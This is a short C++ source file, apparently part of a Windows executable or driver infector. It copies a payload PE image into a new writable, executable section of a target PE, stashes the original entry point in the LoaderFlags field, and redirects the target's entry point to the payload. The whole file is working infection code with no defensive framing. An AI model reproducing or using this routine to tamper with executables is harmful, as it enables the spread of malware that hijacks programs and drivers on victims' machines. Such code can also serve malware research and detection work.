#include "Infect.h"

Pe Infect::target;
Pe Infect::payload;

/*
	Purpose:

	Inject a payload PE file into the target PE file.
	Copy the payload into a new section.
	Save the original entry point and update the target entry point to the payload.
*/
bool Infect::InfectPe()
{
	/* Get payload headers size */
	size_t sizeOfHeaders = payload.ntHeaders->OptionalHeader.SizeOfHeaders;

	/* Calculate the payload image size (without headers) */
	size_t dataSize = payload.buffer.size() - sizeOfHeaders;

	/* Save pointer to Entry Point */
	target.ntHeaders->OptionalHeader.LoaderFlags = target.ntHeaders->OptionalHeader.AddressOfEntryPoint;

	/* Adding the new section that will hold the payload image */
	target.addSection(PAYLOAD_SECTION, dataSize, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE);

	/* Get pointer to the payload section */
	IMAGE_SECTION_HEADER* payload_sec = target.getSectionByName(PAYLOAD_SECTION);
	uint8_t* payload_data = target.getSectionData(*payload_sec);

    /* Copy payload image as shellcode to the new section */
    std::memcpy(payload_data, payload.buffer.data() + sizeOfHeaders, dataSize);

	/* Set EP to the section start (DriverEntry) */
	target.ntHeaders->OptionalHeader.AddressOfEntryPoint = payload_sec->VirtualAddress;

	return true;
}